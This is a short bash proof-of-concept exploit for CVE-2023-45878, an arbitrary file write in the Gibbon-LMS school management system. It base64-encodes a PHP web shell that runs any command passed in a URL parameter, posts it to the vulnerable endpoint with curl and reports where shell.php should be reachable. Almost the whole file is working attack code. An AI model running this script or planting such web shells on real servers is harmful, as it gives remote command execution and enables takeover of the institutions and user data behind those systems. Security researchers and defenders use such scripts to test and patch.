#!/bin/bash

#--------------------------------------------------------------
# Script to exploit an Arbitrary File Write on Gibbon-LMS (CVE-2023-45878)
# Advisory: USD-2023-0025 (https://herolab.usd.de/security-advisories/usd-2023-0025/)
# Author - luks (@luksecurity_) - Not the original discoverer of the CVE
#--------------------------------------------------------------

# Target URL for the vulnerable endpoint
url="url_target"

php_payload="<?php echo system(\$_GET['cmd']);?>"
encoded_php_payload=$(echo -n "$php_payload" | base64)
path="shell.php"
gibbonPersonID="0000000001"

payload="img=image/png;asdf,$encoded_php_payload&path=$path&gibbonPersonID=$gibbonPersonID"

response=$(curl -s -w "%{http_code}" -o /dev/null -X POST -d "$payload" "$url")

if [ "$response" -eq 200 ]; then
  echo "Payload sent successfully. The file should be accessible at: $url/$path"
else
  echo "Failed to send payload. HTTP status code: $response"
fi
